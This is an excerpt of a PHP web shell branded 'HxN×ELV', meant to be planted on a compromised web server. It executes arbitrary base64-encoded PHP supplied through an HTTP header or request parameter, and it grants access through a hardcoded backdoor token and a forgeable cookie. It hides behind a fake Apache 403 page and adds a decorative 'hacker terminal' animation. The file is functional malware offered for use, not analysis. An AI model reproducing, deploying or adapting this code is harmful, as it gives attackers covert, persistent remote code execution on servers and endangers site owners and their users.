...
$api_payload='';
if(isset($_SERVER['HTTP_X_ELV_RUN']))$api_payload=@base64_decode($_SERVER['HTTP_X_ELV_RUN']);
elseif(isset($_REQUEST['elv_run']))$api_payload=@base64_decode($_REQUEST['elv_run']);
if(!empty($api_payload)){
if(strpos($api_payload,'<?')===false)$api_payload="<?php\n".$api_payload;
$GLOBALS['_ELV_MEM_PAYLOAD']=$api_payload;ob_start();@include('elvmem://run');$api_out=ob_get_clean();die($api_out);
}
if(isset($_SERVER['HTTP_X_AUTH_TOKEN'])&&$_SERVER['HTTP_X_AUTH_TOKEN']==='WHY-ALWAYS-ME'){$_SESSION['shell_unlocked']=true;$_SESSION['elv_logged_in']=true;@setcookie('Greetings','HxN×ELV',time()+(86400*30),"/");}
$auth_hash='$2y$10$FDsi2BfOgTJeukKUMEjtYORWHWQA6ltpIOKcw8J6EMQol/F.PrQyW';
$already_logged=((isset($_SESSION['elv_logged_in'])&&$_SESSION['elv_logged_in']===true)||(isset($_COOKIE['Greetings'])&&$_COOKIE['Greetings']==='HxN×ELV'));
if(!$already_logged){http_response_code(403);echo'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access this resource.</p><hr><address>HxN/E.L.V/windows v1.00 Server at '.htmlspecialchars($_SERVER['HTTP_HOST']).' Port 80</address></body></html>';exit;}
...
if(isset($_POST['l_pass'])){if(password_verify($_POST['l_pass'],$auth_hash)){$_SESSION['elv_logged_in']=true;setcookie('Greetings','HxN×ELV',time()+(86400*30),"/");header("Location: ?");exit;}else{$login_err="ACCESS DENIED SECURITY BREACH DETECTED";}}
$is_logged_in=false;
if((isset($_SESSION['elv_logged_in'])&&$_SESSION['elv_logged_in']===true)||(isset($_COOKIE['Greetings'])&&$_COOKIE['Greetings']==='HxN×ELV')){$is_logged_in=true;if(!isset($_SESSION['elv_logged_in']))$_SESSION['elv_logged_in']=true;}
$bg_terminal_js="const c=document.getElementById('terminal-bg'),x=c.getContext('2d');c.width=innerWidth;c.height=innerHeight;const d=['root@HxN×ELV:~# systemctl start neon-grid','root@HxN×ELV:~# traceroute 192.168.7.77','root@HxN×ELV:~# tail -f /var/log/cyberpunk.log','[ OK ] ELV mainframe connected.','[+] NEON GRID OVERDRIVE PROTOCOL CYAN ACTIVE','root@HxN×ELV:~# netstat -tulpn | grep LISTEN','tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN','tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN','[*] Hacking the Gibson SUCCESS','[+] Payload deployed cyberdeck_override.sh','root@HxN×ELV:~# id','uid=0(root) gid=0(root) groups=0(root)','root@HxN×ELV:~# uname -a','Linux ELV-core 6.8.0-cyberdeck SMP','root@HxN×ELV:~# ./exploit.sh','[!] NEON PURPLE OVERLOAD QUANTUM BREACH','[ CYAN ] quantum-tunnel established on eth0','[ PURPLE ] neural-interface synchronized','[ MAGENTA ] payload injection complete','[ GREEN ] access granted to sector-7g','[ RED ] firewall breach in progress','root@HxN×ELV:~# cat /etc/neon.conf','NEON MODE cyberpunk GRID overdrive','root@HxN×ELV:~# ./pwn','[+] Reverse shell connected','[ CYAN ] encrypted channel AES-256-GCM','[ PURPLE ] post-exploitation module loaded'],l=['#00e5ff','#8a2be2','#ff00ff','#00ff88','#ff1493','#ffd700','#ff6600','#ff0044'];let q=[];let m=Math.floor(c.height/22);let s=Math.floor(m/1.1);for(let i=0;i<s;i++)q.push({t:d[Math.floor(Math.random()*d.length)],c:l[Math.floor(Math.random()*l.length)]});function a(){if(q.length>m)q.shift();q.push({t:d[Math.floor(Math.random()*d.length)],c:l[Math.floor(Math.random()*l.length)]})}setInterval(function(){x.clearRect(0,0,c.width,c.height);x.font='bold 14px monospace';for(let i=0;i<q.length;i++){x.fillStyle=q[i].c;x.shadowBlur=18;x.shadowColor=q[i].c;x.fillText(q[i].t,15,30+(i*22));x.shadowBlur=0}if(Math.random()>0.3)a()},250);window.addEventListener('resize',function(){c.width=window.innerWidth;c.height=window.innerHeight;m=Math.floor(c.height/22);x.clearRect(0,0,c.width,c.height)});";
...
.hs{margin-top:2px}
.hs img{height:52px;filter:drop-shadow(0 0 12px rgba(0,229,255,0.3));display:block}
...
@media(max-width:600px){.tools{grid-template-columns:1fr}.hg{grid-template-columns:repeat(2,1fr)}.wrap{padding:12px}.nav a{font-size:28px;padding:10px 14px}.blc{width:55px;height:55px}.hs img{height:40px}}
...
<span style="color:var(--m);font-weight:700;margin-right:12px;padding:8px 0;text-shadow:0 0 5px var(--m)">HxN×ELV:~#</span>
